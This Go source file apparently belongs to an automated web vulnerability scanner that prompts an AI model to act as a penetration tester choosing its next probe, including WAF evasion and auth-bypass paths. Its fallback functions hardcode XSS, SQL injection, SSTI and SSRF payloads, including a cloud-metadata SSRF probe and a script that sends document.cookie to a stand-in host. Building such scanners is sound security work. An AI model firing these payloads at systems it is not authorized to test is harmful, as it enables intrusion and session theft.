package ai

import (
	"context"
	"encoding/json"
	"strings"

	"auto-bughunter/backend/internal/model"
)

// ProbeDecision is the AI's choice of what single probe to execute next, or
// an instruction to stop when the evidence justifies it.
type ProbeDecision struct {
	// Action is either "probe" (execute the described probe) or "stop"
	// (the AI has enough information and recommends ending the loop).
	Action string `json:"action"`

	// --- Fields populated when Action == "probe" ---

	// Category is the vulnerability class to test (e.g. "xss", "sqli", "cors").
	Category string `json:"category,omitempty"`

	// Endpoint is the exact URL to probe.
	Endpoint string `json:"endpoint,omitempty"`

	// ParamName is the HTTP parameter to inject into. Empty means the probe
	// type determines its own parameter (e.g. CORS uses an Origin header).
	ParamName string `json:"paramName,omitempty"`

	// Payload is the exact string to send as the parameter value.
	// The AI chooses this based on evidence — it should NOT default to a
	// generic playbook payload when prior probes provide stronger signal.
	Payload string `json:"payload,omitempty"`

	// Rationale is the AI's plain-English explanation of WHY this specific
	// probe is the most valuable next step given the current evidence.
	// This is shown verbatim in the operator console so the operator can
	// follow the AI's reasoning in real time.
	Rationale string `json:"rationale,omitempty"`

	// Thinking is the AI's chain-of-thought reasoning produced before it commits
	// to this probe decision. It is shown in the operator console as a
	// ScanEventThinking event so operators can follow the AI's reasoning live.
	// Empty when the local rule-based fallback is used.
	Thinking string `json:"thinking,omitempty"`

	// GoalAlignment is a 0–1 score the AI assigns to how directly this probe
	// advances the engagement's ImpactGoal(s). Used by the orchestrator to
	// penalise low-alignment rounds when deciding whether to continue.
	GoalAlignment float64 `json:"goalAlignment,omitempty"`

	// --- Fields populated when Action == "stop" ---

	// StopReason explains why the AI decided to stop iterating.
	StopReason string `json:"stopReason,omitempty"`
}

// probeObservation is a compact, prompt-serialisable view of one ProbeResult.
type probeObservation struct {
	Step        int    `json:"step"`
	Category    string `json:"category"`
	Endpoint    string `json:"endpoint"`
	ParamName   string `json:"paramName,omitempty"`
	Payload     string `json:"payload"`
	Outcome     string `json:"outcome"`
	StatusCode  int    `json:"statusCode"`
	Observation string `json:"observation"`
	Confirmed   bool   `json:"confirmed"`
}

// DecideNextProbe asks the configured AI model to choose the single most
// valuable HTTP probe to execute next, based on the full history of probe
// results seen so far. This implements the observe → reason → act loop:
//
//   - The AI reads every prior probe result including the plain-English
//     HTTP observations (WAF blocks, near-misses, server errors) and all
//     confirmed findings.
//   - It reasons about what specific signal justifies the next probe, NOT
//     what the next item in a playbook would be.
//   - It returns exactly ONE ProbeDecision, or action="stop" when the
//     evidence justifies ending the loop.
//
// The conversation history is maintained by the caller (AdaptiveProbeAgent)
// and passed on every call so the AI has full context without needing
// server-side session state.
//
// Falls back to a rule-based local decision when no AI provider is configured.
func (c *Client) DecideNextProbe(
	ctx context.Context,
	target string,
	allFindings []model.Finding,
	probeHistory []model.ProbeResult,
	endpoints []string,
	stepBudgetRemaining int,
	goals []model.ImpactGoal,
	policyPack ...string,
) ProbeDecision {
	if c == nil || !c.shouldCallProvider() {
		return localProbeDecision(target, allFindings, probeHistory, endpoints, stepBudgetRemaining, goals)
	}

	// Build compact observation history for the prompt.
	observations := make([]probeObservation, 0, len(probeHistory))
	for i, pr := range probeHistory {
		observations = append(observations, probeObservation{
			Step:        i + 1,
			Category:    pr.Category,
			Endpoint:    pr.Endpoint,
			ParamName:   pr.ParamName,
			Payload:     pr.Payload,
			Outcome:     string(pr.Outcome),
			StatusCode:  pr.StatusCode,
			Observation: pr.Observation,
			Confirmed:   pr.Confirmed,
		})
	}

	// Build confirmed-findings summary.
	confirmedSummary := make([]map[string]string, 0, len(allFindings))
	for _, f := range allFindings {
		confirmedSummary = append(confirmedSummary, map[string]string{
			"category": f.Category,
			"severity": string(f.Severity),
			"title":    f.Title,
			"url":      f.AffectedURL,
		})
	}

	goalStrs := make([]string, 0, len(goals))
	for _, g := range goals {
		goalStrs = append(goalStrs, string(g))
	}

	baseInstructions := "You are an expert penetration tester driving an adaptive web application probe loop. " +
		"You will receive the FULL history of HTTP probe results so far, including the plain-English " +
		"'observation' field that describes what each probe actually observed at the HTTP level. " +
		"\n\n" +
		"Your task: choose the SINGLE most valuable probe to execute next. " +
		"Do NOT follow a fixed checklist. Reason from the evidence:\n" +
		"- Treat a finding as likely false positive when signals are non-repeatable, confidence is low, or state-change checks repeatedly say no material delta.\n" +
		"- Treat SPA targets as API-driven attack surfaces: prioritize JSON/XHR/fetch endpoints, auth/session APIs, and client-side route-backed calls over static HTML-only checks.\n" +
		"- Determine state change by comparing pre/post response status and body-length deltas in observations; require a material delta or repeatable side effect before escalating confidence.\n" +
		"- If outcome='waf_blocked': the payload was filtered — pick an evasion-variant payload for the SAME endpoint\n" +
		"- If outcome='near_miss': partial signal — refine the payload for the specific observed context\n" +
		"- If outcome='server_error': exception triggered — try a blind/time-based follow-up on the SAME endpoint\n" +
		"- If outcome='no_signal': move on — try a DIFFERENT endpoint, parameter, or category\n" +
		"- If outcome='confirmed': the finding is proven — pivot to related attack surface (same endpoint, different category; or next endpoint)\n" +
		"\n" +
		"If stepBudgetRemaining is 0, or you have confirmed high-value findings and the remaining surface " +
		"appears clean, set action='stop' and explain why in stopReason.\n" +
		"When a 'knowledgeGuidance' field is present, prefer the techniques and payloads it describes " +
		"(curated from HackTricks / PayloadsAllTheThings) when they fit the observed evidence.\n"

	// Inject policy-specific constraints based on the automation profile.
	// Also parse the low-signal advisory suffix that the AdaptiveProbeAgent
	// encodes as "policyPack;low-signal-advisory:cat1,cat2".
	policy := ""
	var lowSignalAdvisory []string
	if len(policyPack) > 0 {
		raw := strings.TrimSpace(policyPack[0])
		for _, part := range strings.Split(raw, ";") {
			part = strings.TrimSpace(part)
			if strings.HasPrefix(part, "low-signal-advisory:") {
				cats := strings.TrimPrefix(part, "low-signal-advisory:")
				for _, c := range strings.Split(cats, ",") {
					if c = strings.TrimSpace(c); c != "" {
						lowSignalAdvisory = append(lowSignalAdvisory, c)
					}
				}
			} else if part != "" {
				policy = strings.ToLower(part)
			}
		}
	}
	switch policy {
	case "safe":
		baseInstructions += "\nPOLICY CONSTRAINT (safe mode): " +
			"Do NOT suggest probes that involve authentication bypass, session hijacking, or destructive payloads. " +
			"Require at least two corroborating signals before promoting any finding. " +
			"Prefer passive observation and low-noise probes. Favour 'stop' over speculative further probing.\n"
	case "aggressive":
		baseInstructions += "\nPOLICY CONSTRAINT (aggressive mode): " +
			"Prioritise novel payload families and chained attack paths. " +
			"If previous probes suggest WAF filtering, try evasion variants even on endpoints already probed. " +
			"Explore authentication bypass and privilege escalation paths when credentials are available.\n"
	default:
		// autonomous / canary — no extra constraint text needed
	}
	if len(lowSignalAdvisory) > 0 {
		baseInstructions += "\nHISTORICAL SIGNAL ADVISORY: The following categories have consistently returned " +
			"no_signal across recent scans of this target — consider these low-priority unless new evidence emerges: " +
			strings.Join(lowSignalAdvisory, ", ") + ".\n"
	}
	if len(goalStrs) > 0 {
		baseInstructions += "\nENGAGEMENT GOAL(S): " + strings.Join(goalStrs, ", ") + ". " +
			"Prefer probes that, if confirmed, directly demonstrate one of these goals. " +
			"Before committing to the probe, internally rate how well it advances the goal (0–1) " +
			"and include that score in the 'goalAlignment' field of your JSON response.\n"
	}
	baseInstructions += "\nReply with strict JSON only:\n" +
		`{"action":"probe"|"stop","thinking":string,"goalAlignment":number,"category":string,"endpoint":string,"paramName":string,"payload":string,"rationale":string,"stopReason":string}`

	payload := map[string]any{
		"target":              target,
		"availableEndpoints":  endpoints,
		"probeHistory":        observations,
		"confirmedFindings":   confirmedSummary,
		"stepBudgetRemaining": stepBudgetRemaining,
		"availableCategories": []string{
			"xss", "sqli", "open_redirect", "cors", "ssrf",
			"auth_bypass", "idor", "ssti", "business_logic",
		},
		"instructions": baseInstructions,
	}
	if len(goalStrs) > 0 {
		payload["impactGoals"] = goalStrs
	}

	// Ground the decision in curated security knowledge when available.
	if guidance := c.retrieveKnowledgeGuidance(
		ctx,
		"adaptive-probe",
		probeKnowledgeQuery(target, allFindings, probeHistory),
		probeKnowledgeCategories(allFindings, probeHistory),
		5,
		1200,
	); guidance != "" {
		payload["knowledgeGuidance"] = guidance
	}

	userJSON, err := json.Marshal(payload)
	if err != nil {
		return localProbeDecision(target, allFindings, probeHistory, endpoints, stepBudgetRemaining, goals)
	}

	messages := []Message{
		{
			Role: "system",
			Content: "You are an expert penetration tester. Decide the single most valuable next HTTP probe " +
				"based on the evidence so far. Reason from observations, not from a fixed playbook. Reply with strict JSON.",
		},
		{Role: "user", Content: string(userJSON)},
	}

	content, err := c.fastComplete(ctx, messages, 0.2, true)
	if err != nil || content == "" {
		return localProbeDecision(target, allFindings, probeHistory, endpoints, stepBudgetRemaining, goals)
	}

	var decision ProbeDecision
	if err := json.Unmarshal([]byte(content), &decision); err != nil {
		return localProbeDecision(target, allFindings, probeHistory, endpoints, stepBudgetRemaining, goals)
	}

	decision.Action = strings.ToLower(strings.TrimSpace(decision.Action))
	decision.Category = strings.ToLower(strings.TrimSpace(decision.Category))
	decision.Endpoint = strings.TrimSpace(decision.Endpoint)
	decision.ParamName = strings.TrimSpace(decision.ParamName)
	decision.Payload = strings.TrimSpace(decision.Payload)
	decision.Thinking = strings.TrimSpace(decision.Thinking)
	decision.Rationale = strings.TrimSpace(decision.Rationale)
	decision.StopReason = strings.TrimSpace(decision.StopReason)

	// Validate: probe decisions must have a category and endpoint.
	if decision.Action == "probe" && (decision.Category == "" || decision.Endpoint == "") {
		return localProbeDecision(target, allFindings, probeHistory, endpoints, stepBudgetRemaining, goals)
	}

	return decision
}

// allProbeCategories is the ordered list of categories the local decider cycles
// through in absence of an AI provider.
var allProbeDecisionCategories = []string{
	"xss", "sqli", "cors", "open_redirect", "ssrf",
	"auth_bypass", "idor", "ssti", "business_logic",
}

// localProbeDecision is the rule-based fallback used when no AI provider is
// configured. It selects the next probe based on simple coverage heuristics:
//  1. WAF-blocked probes get one evasion-variant retry.
//  2. Near-miss probes get one refined follow-up.
//  3. Server-error probes get one blind follow-up.
//  4. Otherwise, pick the next uncovered (category, endpoint) combination.
func localProbeDecision(
	target string,
	allFindings []model.Finding,
	probeHistory []model.ProbeResult,
	endpoints []string,
	stepBudgetRemaining int,
	goals []model.ImpactGoal,
) ProbeDecision {
	_ = goals
	if stepBudgetRemaining <= 0 {
		confirmedCount := 0
		for _, pr := range probeHistory {
			if pr.Confirmed {
				confirmedCount++
			}
		}
		return ProbeDecision{
			Action:     "stop",
			StopReason: "Step budget exhausted after " + itoa(len(probeHistory)) + " probes. " + itoa(confirmedCount) + " vulnerability(ies) confirmed.",
		}
	}

	// Collect what's already been tried.
	type triedKey struct{ cat, ep string }
	tried := map[triedKey][]model.ProbeOutcome{}
	for _, pr := range probeHistory {
		k := triedKey{strings.ToLower(pr.Category), pr.Endpoint}
		tried[k] = append(tried[k], pr.Outcome)
	}

	// Priority 1: Retry WAF-blocked probes with evasion payloads.
	for _, pr := range probeHistory {
		if pr.Outcome != model.ProbeWAFBlocked {
			continue
		}
		cat := strings.ToLower(strings.TrimSpace(pr.Category))
		alt := evasionPayload(cat, pr.Payload)
		if alt == "" || alt == pr.Payload {
			continue
		}
		// Check we haven't already tried this evasion.
		k := triedKey{cat, pr.Endpoint}
		alreadyTriedEvasion := false
		for _, o := range tried[k] {
			if o != model.ProbeWAFBlocked {
				alreadyTriedEvasion = true
				break
			}
		}
		if !alreadyTriedEvasion {
			return ProbeDecision{
				Action:    "probe",
				Category:  pr.Category,
				Endpoint:  pr.Endpoint,
				ParamName: pr.ParamName,
				Payload:   alt,
				Rationale: "Prior probe on " + pr.Endpoint + " was WAF-blocked (HTTP " + itoa(pr.StatusCode) + "). " +
					"Retrying with URL-encoded evasion variant to bypass filtering and reach application logic.",
			}
		}
	}

	// Priority 2: Refine near-miss probes.
	for _, pr := range probeHistory {
		if pr.Outcome != model.ProbeNearMiss {
			continue
		}
		cat := strings.ToLower(strings.TrimSpace(pr.Category))
		k := triedKey{cat, pr.Endpoint}
		if len(tried[k]) > 1 {
			continue // already retried
		}
		alt := refinedPayload(cat, pr.Payload)
		if alt == "" || alt == pr.Payload {
			continue
		}
		return ProbeDecision{
			Action:    "probe",
			Category:  pr.Category,
			Endpoint:  pr.Endpoint,
			ParamName: pr.ParamName,
			Payload:   alt,
			Rationale: "Near-miss signal observed on " + pr.Endpoint + ": " + truncateObs(pr.Observation, 120) + " " +
				"Retrying with a context-specific refined payload.",
		}
	}

	// Priority 3: Blind follow-up for server-error probes.
	for _, pr := range probeHistory {
		if pr.Outcome != model.ProbeServerError {
			continue
		}
		cat := strings.ToLower(strings.TrimSpace(pr.Category))
		k := triedKey{cat, pr.Endpoint}
		if len(tried[k]) > 1 {
			continue
		}
		blind := blindDecisionPayload(cat)
		if blind == "" {
			continue
		}
		return ProbeDecision{
			Action:    "probe",
			Category:  pr.Category,
			Endpoint:  pr.Endpoint,
			ParamName: pr.ParamName,
			Payload:   blind,
			Rationale: "Server returned HTTP " + itoa(pr.StatusCode) + " on " + pr.Endpoint + " — unhandled exception triggered by injection payload. " +
				"Following up with a blind/time-based probe to confirm exploitability without relying on error output.",
		}
	}

	// Priority 4: Next uncovered (category, endpoint) combination.
	ep := target
	if len(endpoints) > 0 {
		ep = endpoints[0]
	}
	for _, cat := range allProbeDecisionCategories {
		// Skip already-confirmed categories.
		confirmedCat := false
		for _, f := range allFindings {
			if strings.ToLower(f.Category) == cat {
				confirmedCat = true
				break
			}
		}
		for _, endpoint := range append([]string{ep}, endpoints...) {
			k := triedKey{cat, endpoint}
			if _, seen := tried[k]; !seen {
				return ProbeDecision{
					Action:    "probe",
					Category:  cat,
					Endpoint:  endpoint,
					Rationale: "Category " + cat + " has not been tested on " + endpoint + " yet. Probing to ensure full coverage.",
				}
			}
		}
		if confirmedCat {
			continue
		}
	}

	// All combinations covered — stop.
	confirmed := 0
	for _, pr := range probeHistory {
		if pr.Confirmed {
			confirmed++
		}
	}
	return ProbeDecision{
		Action:     "stop",
		StopReason: "All category/endpoint combinations have been probed. " + itoa(confirmed) + " vulnerability(ies) confirmed across " + itoa(len(probeHistory)) + " probes.",
	}
}

// evasionPayload returns an evasion-variant of payload for WAF-blocked probes.
func evasionPayload(category, previous string) string {
	_ = previous
	switch category {
	case "xss":
		return "%22%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
	case "sqli":
		return "1%27%20AND%20SLEEP(5)--%20"
	case "ssti":
		return "%7B%7B7*7%7D%7D"
	case "open_redirect":
		return "%2F%2Fevil.example.com%2F"
	default:
		return ""
	}
}

// refinedPayload returns a context-specific refined payload for near-miss probes.
func refinedPayload(category, previous string) string {
	_ = previous
	switch category {
	case "xss":
		return `";alert(1)//`
	case "sqli":
		return `1 AND 1=1--`
	case "ssti":
		return `${7*7}`
	case "cors":
		return `Origin: null`
	default:
		return ""
	}
}

// blindDecisionPayload returns a blind/time-based payload for server-error follow-ups.
func blindDecisionPayload(category string) string {
	switch category {
	case "sqli":
		return `1; WAITFOR DELAY '0:0:5'--`
	case "ssti":
		return `{{cycler.__init__.__globals__.os.urandom(1)}}`
	case "xss":
		return `<script>fetch('https://probe.example.com/?c='+document.cookie)</script>`
	case "ssrf":
		return `http://169.254.169.254/`
	default:
		return ""
	}
}

// truncateObs shortens an observation string for use in rationale text.
func truncateObs(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// probeKnowledgeCategories collects the distinct vulnerability categories
// present in the confirmed findings and probe history so the knowledge query is
// scoped to the techniques currently in play.
func probeKnowledgeCategories(findings []model.Finding, history []model.ProbeResult) []string {
	seen := map[string]struct{}{}
	out := make([]string, 0, 8)
	add := func(c string) {
		c = strings.ToLower(strings.TrimSpace(c))
		if c == "" {
			return
		}
		if _, ok := seen[c]; ok {
			return
		}
		seen[c] = struct{}{}
		out = append(out, c)
	}
	for _, f := range findings {
		add(f.Category)
	}
	for _, p := range history {
		add(p.Category)
	}
	return out
}

// probeKnowledgeQuery builds a compact free-text query describing the current
// probing context for knowledge retrieval.
func probeKnowledgeQuery(target string, findings []model.Finding, history []model.ProbeResult) string {
	cats := probeKnowledgeCategories(findings, history)
	return strings.TrimSpace("adaptive web probe target=" + target + " categories=" + strings.Join(cats, ", "))
}
